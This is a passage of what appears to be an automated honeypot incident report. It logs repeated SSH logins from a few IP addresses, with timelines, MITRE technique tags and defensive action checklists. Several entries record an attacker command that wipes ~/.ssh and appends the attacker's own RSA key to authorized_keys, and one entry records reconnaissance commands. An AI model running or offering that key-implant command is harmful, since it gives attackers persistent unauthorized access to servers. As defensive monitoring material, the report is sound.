| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:48:22` | `cowrie.session.connect` |
| `2026-05-05 03:48:22` | `cowrie.client.version` |
| `2026-05-05 03:48:22` | `cowrie.client.kex` |
| `2026-05-05 03:48:23` | `cowrie.login.success` |
| `2026-05-05 03:48:23` | `cowrie.session.params` |
| `2026-05-05 03:48:23` | `cowrie.command.input` |
| `2026-05-05 03:48:23` | `cowrie.command.failed` |
| `2026-05-05 03:48:24` | `cowrie.log.closed` |
| `2026-05-05 03:48:24` | `cowrie.session.params` |
| `2026-05-05 03:48:24` | `cowrie.command.input` |
| `2026-05-05 03:48:25` | `cowrie.session.file_download` |
| `2026-05-05 03:48:25` | `cowrie.log.closed` |
| `2026-05-05 03:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-096bb1c4dfba

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:48 |
| **Last Seen** | 2026-05-05 03:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:48:28` | `cowrie.session.connect` |
| `2026-05-05 03:48:28` | `cowrie.client.version` |
| `2026-05-05 03:48:28` | `cowrie.client.kex` |
| `2026-05-05 03:48:29` | `cowrie.login.success` |
| `2026-05-05 03:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67bda647c06d

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:50 |
| **Last Seen** | 2026-05-05 03:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:50:51` | `cowrie.session.connect` |
| `2026-05-05 03:50:51` | `cowrie.client.version` |
| `2026-05-05 03:50:52` | `cowrie.client.kex` |
| `2026-05-05 03:50:53` | `cowrie.login.success` |
| `2026-05-05 03:50:53` | `cowrie.session.params` |
| `2026-05-05 03:50:53` | `cowrie.command.input` |
| `2026-05-05 03:50:53` | `cowrie.command.failed` |
| `2026-05-05 03:50:54` | `cowrie.log.closed` |
| `2026-05-05 03:50:54` | `cowrie.session.params` |
| `2026-05-05 03:50:54` | `cowrie.command.input` |
| `2026-05-05 03:50:54` | `cowrie.session.file_download` |
| `2026-05-05 03:50:54` | `cowrie.log.closed` |
| `2026-05-05 03:50:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6058eedc9dcb

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:50 |
| **Last Seen** | 2026-05-05 03:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:50:57` | `cowrie.session.connect` |
| `2026-05-05 03:50:57` | `cowrie.client.version` |
| `2026-05-05 03:50:58` | `cowrie.client.kex` |
| `2026-05-05 03:50:59` | `cowrie.login.success` |
| `2026-05-05 03:50:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dbe27265d44

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:51 |
| **Last Seen** | 2026-05-05 03:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:51:44` | `cowrie.session.connect` |
| `2026-05-05 03:51:44` | `cowrie.client.version` |
| `2026-05-05 03:51:44` | `cowrie.client.kex` |
| `2026-05-05 03:51:45` | `cowrie.login.success` |
| `2026-05-05 03:51:46` | `cowrie.session.params` |
| `2026-05-05 03:51:46` | `cowrie.command.input` |
| `2026-05-05 03:51:46` | `cowrie.command.failed` |
| `2026-05-05 03:51:46` | `cowrie.log.closed` |
| `2026-05-05 03:51:47` | `cowrie.session.params` |
| `2026-05-05 03:51:47` | `cowrie.command.input` |
| `2026-05-05 03:51:47` | `cowrie.session.file_download` |
| `2026-05-05 03:51:47` | `cowrie.log.closed` |
| `2026-05-05 03:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ae6076bf0df

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:51 |
| **Last Seen** | 2026-05-05 03:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:51:50` | `cowrie.session.connect` |
| `2026-05-05 03:51:50` | `cowrie.client.version` |
| `2026-05-05 03:51:50` | `cowrie.client.kex` |
| `2026-05-05 03:51:51` | `cowrie.login.success` |
| `2026-05-05 03:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4a72da94dc8

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:53 |
| **Last Seen** | 2026-05-05 03:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:53:30` | `cowrie.session.connect` |
| `2026-05-05 03:53:30` | `cowrie.client.version` |
| `2026-05-05 03:53:30` | `cowrie.client.kex` |
| `2026-05-05 03:53:31` | `cowrie.login.success` |
| `2026-05-05 03:53:32` | `cowrie.session.params` |
| `2026-05-05 03:53:32` | `cowrie.command.input` |
| `2026-05-05 03:53:32` | `cowrie.command.failed` |
| `2026-05-05 03:53:32` | `cowrie.log.closed` |
| `2026-05-05 03:53:32` | `cowrie.session.params` |
| `2026-05-05 03:53:32` | `cowrie.command.input` |
| `2026-05-05 03:53:33` | `cowrie.session.file_download` |
| `2026-05-05 03:53:33` | `cowrie.log.closed` |
| `2026-05-05 03:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd4590e01739

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:53 |
| **Last Seen** | 2026-05-05 03:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:53:36` | `cowrie.session.connect` |
| `2026-05-05 03:53:36` | `cowrie.client.version` |
| `2026-05-05 03:53:36` | `cowrie.client.kex` |
| `2026-05-05 03:53:38` | `cowrie.login.success` |
| `2026-05-05 03:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bf7fb341252

| Field | Detail |
|---|---|
| **Source IP** | `121.165.84[.]80` |
| **First Seen** | 2026-05-05 03:54 |
| **Last Seen** | 2026-05-05 03:55 |
| **Session Duration** | 45s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:54:26` | `cowrie.session.connect` |
| `2026-05-05 03:54:26` | `cowrie.client.version` |
| `2026-05-05 03:54:27` | `cowrie.client.kex` |
| `2026-05-05 03:54:27` | `cowrie.login.failed` |
| `2026-05-05 03:54:28` | `cowrie.login.success` |
| `2026-05-05 03:54:29` | `cowrie.session.params` |
| `2026-05-05 03:54:29` | `cowrie.command.input` |
| `2026-05-05 03:54:29` | `cowrie.command.failed` |
| `2026-05-05 03:54:29` | `cowrie.log.closed` |
| `2026-05-05 03:54:29` | `cowrie.session.params` |
| `2026-05-05 03:54:29` | `cowrie.command.input` |
| `2026-05-05 03:54:29` | `cowrie.log.closed` |
| `2026-05-05 03:54:30` | `cowrie.session.params` |
| `2026-05-05 03:54:30` | `cowrie.command.input` |
| `2026-05-05 03:54:30` | `cowrie.log.closed` |
| `2026-05-05 03:54:30` | `cowrie.session.params` |
| `2026-05-05 03:54:30` | `cowrie.command.input` |
| `2026-05-05 03:54:30` | `cowrie.log.closed` |
| `2026-05-05 03:54:31` | `cowrie.session.params` |
| `2026-05-05 03:54:31` | `cowrie.command.input` |
| `2026-05-05 03:54:31` | `cowrie.log.closed` |
| `2026-05-05 03:54:31` | `cowrie.session.params` |
| `2026-05-05 03:54:31` | `cowrie.command.input` |
| `2026-05-05 03:54:31` | `cowrie.log.closed` |
| `2026-05-05 03:54:31` | `cowrie.session.params` |
| `2026-05-05 03:54:31` | `cowrie.command.input` |
| `2026-05-05 03:54:32` | `cowrie.log.closed` |
| `2026-05-05 03:54:32` | `cowrie.session.params` |
| `2026-05-05 03:54:32` | `cowrie.command.input` |
| `2026-05-05 03:54:32` | `cowrie.log.closed` |
| `2026-05-05 03:54:32` | `cowrie.session.params` |
| `2026-05-05 03:54:32` | `cowrie.command.input` |
| `2026-05-05 03:54:33` | `cowrie.log.closed` |
| `2026-05-05 03:55:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.165.84[.]80` to AbuseIPDB if not already reported
- [ ] Block `121.165.84[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03d6d5231428

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:55 |
| **Last Seen** | 2026-05-05 03:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:55:12` | `cowrie.session.connect` |
| `2026-05-05 03:55:12` | `cowrie.client.version` |
| `2026-05-05 03:55:12` | `cowrie.client.kex` |
| `2026-05-05 03:55:13` | `cowrie.login.success` |
| `2026-05-05 03:55:14` | `cowrie.session.params` |
| `2026-05-05 03:55:14` | `cowrie.command.input` |
| `2026-05-05 03:55:14` | `cowrie.command.failed` |
| `2026-05-05 03:55:14` | `cowrie.log.closed` |
| `2026-05-05 03:55:15` | `cowrie.session.params` |
| `2026-05-05 03:55:15` | `cowrie.command.input` |
| `2026-05-05 03:55:15` | `cowrie.session.file_download` |
| `2026-05-05 03:55:15` | `cowrie.log.closed` |
| `2026-05-05 03:55:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9c67b70763d

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:55 |
| **Last Seen** | 2026-05-05 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:55:18` | `cowrie.session.connect` |
| `2026-05-05 03:55:18` | `cowrie.client.version` |
| `2026-05-05 03:55:18` | `cowrie.client.kex` |
| `2026-05-05 03:55:19` | `cowrie.login.success` |
| `2026-05-05 03:55:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e418cb980190

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:56 |
| **Last Seen** | 2026-05-05 03:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:56:53` | `cowrie.session.connect` |
| `2026-05-05 03:56:53` | `cowrie.client.version` |
| `2026-05-05 03:56:54` | `cowrie.client.kex` |
| `2026-05-05 03:56:55` | `cowrie.login.success` |
| `2026-05-05 03:56:55` | `cowrie.session.params` |
| `2026-05-05 03:56:55` | `cowrie.command.input` |
| `2026-05-05 03:56:55` | `cowrie.command.failed` |
| `2026-05-05 03:56:56` | `cowrie.log.closed` |
| `2026-05-05 03:56:56` | `cowrie.session.params` |
| `2026-05-05 03:56:56` | `cowrie.command.input` |
| `2026-05-05 03:56:56` | `cowrie.session.file_download` |
| `2026-05-05 03:56:56` | `cowrie.log.closed` |
| `2026-05-05 03:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42be434d8c2a

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:56 |
| **Last Seen** | 2026-05-05 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:56:59` | `cowrie.session.connect` |
| `2026-05-05 03:56:59` | `cowrie.client.version` |
| `2026-05-05 03:57:00` | `cowrie.client.kex` |
| `2026-05-05 03:57:01` | `cowrie.login.success` |
| `2026-05-05 03:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00806df7263c

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:57 |
| **Last Seen** | 2026-05-05 03:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:57:44` | `cowrie.session.connect` |
| `2026-05-05 03:57:44` | `cowrie.client.version` |
| `2026-05-05 03:57:44` | `cowrie.client.kex` |
| `2026-05-05 03:57:45` | `cowrie.login.success` |
| `2026-05-05 03:57:46` | `cowrie.session.params` |
| `2026-05-05 03:57:46` | `cowrie.command.input` |
| `2026-05-05 03:57:46` | `cowrie.command.failed` |
| `2026-05-05 03:57:46` | `cowrie.log.closed` |
| `2026-05-05 03:57:46` | `cowrie.session.params` |
| `2026-05-05 03:57:46` | `cowrie.command.input` |
| `2026-05-05 03:57:47` | `cowrie.session.file_download` |
| `2026-05-05 03:57:47` | `cowrie.log.closed` |
| `2026-05-05 03:57:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b46f2aa6f611

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:57 |
| **Last Seen** | 2026-05-05 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:57:50` | `cowrie.session.connect` |
| `2026-05-05 03:57:50` | `cowrie.client.version` |
| `2026-05-05 03:57:50` | `cowrie.client.kex` |
| `2026-05-05 03:57:51` | `cowrie.login.success` |
| `2026-05-05 03:57:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5da236fe00ed

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:58 |
| **Last Seen** | 2026-05-05 03:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:58:36` | `cowrie.session.connect` |
| `2026-05-05 03:58:36` | `cowrie.client.version` |
| `2026-05-05 03:58:36` | `cowrie.client.kex` |
| `2026-05-05 03:58:37` | `cowrie.login.success` |
| `2026-05-05 03:58:37` | `cowrie.session.params` |
| `2026-05-05 03:58:37` | `cowrie.command.input` |
| `2026-05-05 03:58:37` | `cowrie.command.failed` |
| `2026-05-05 03:58:38` | `cowrie.log.closed` |
| `2026-05-05 03:58:38` | `cowrie.session.params` |
| `2026-05-05 03:58:38` | `cowrie.command.input` |
| `2026-05-05 03:58:39` | `cowrie.session.file_download` |
| `2026-05-05 03:58:39` | `cowrie.log.closed` |
| `2026-05-05 03:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc36a54cac5c

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:58 |
| **Last Seen** | 2026-05-05 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:58:42` | `cowrie.session.connect` |
| `2026-05-05 03:58:42` | `cowrie.client.version` |
| `2026-05-05 03:58:42` | `cowrie.client.kex` |
| `2026-05-05 03:58:43` | `cowrie.login.success` |
| `2026-05-05 03:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5675ca1df3a2

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-05-05 06:12 |
